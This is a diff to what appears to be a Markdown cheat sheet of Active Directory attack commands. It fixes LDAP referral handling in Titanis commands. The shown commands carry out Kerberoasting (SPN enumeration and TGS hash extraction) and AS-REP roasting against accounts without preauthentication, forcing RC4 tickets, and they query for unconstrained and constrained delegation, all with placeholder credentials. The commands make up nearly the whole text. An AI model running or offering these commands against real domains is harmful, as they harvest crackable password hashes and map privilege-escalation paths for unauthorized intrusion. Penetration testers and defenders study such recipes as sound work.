@@ -423,8 +423,10 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> kerberoast kerberoast_hashes.txt
 
 # Titanis — enumerate SPNs, get TGT, loop tgsreq per SPN, extract hashes
+# Note: scope with -BaseDN to avoid referral redirect; or use -FollowReferrals if DC is DNS resolver
 Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  "(servicePrincipalName=*)" -OutputFields sAMAccountName,servicePrincipalName > spns.txt
+  "(servicePrincipalName=*)" -OutputFields sAMAccountName,servicePrincipalName \
+  -BaseDN "DC=domain,DC=local" > spns.txt
 Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
   -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
 while IFS= read -r spn; do
@@ -475,9 +477,10 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> asrep
 
 # Titanis — find targets via LDAP, loop asreq
+# Note: -FollowReferrals required on Linux — default behavior prints referral as INFO and returns no records
 Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(userAccountControl|=4194304)" \
-  -OutputFields sAMAccountName > asrep_targets.txt
+  -OutputFields sAMAccountName -FollowReferrals > asrep_targets.txt
 while IFS= read -r user; do
   kerb asreq -UserName "$user" -Realm DOMAIN \
     -Kdc 192.168.1.1 -EncTypes Rc4Hmac \
@@ -1914,15 +1917,15 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 
 # Titanis — unconstrained
 Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  "(userAccountControl|=TrustedForDelegation)" -OutputFields *
+  "(userAccountControl|=TrustedForDelegation)" -OutputFields * -FollowReferrals
 
 # Titanis — constrained
 Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  "(msDS-AllowedToDelegateTo=*)" -OutputFields *
+  "(msDS-AllowedToDelegateTo=*)" -OutputFields * -FollowReferrals
 
 # Titanis — S4U2self only
 Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  "(userAccountControl|=TrustedForS4U2self)" -OutputFields *
+  "(userAccountControl|=TrustedForS4U2self)" -OutputFields * -FollowReferrals
 ```
 
 [↑ Back to Index](#index)
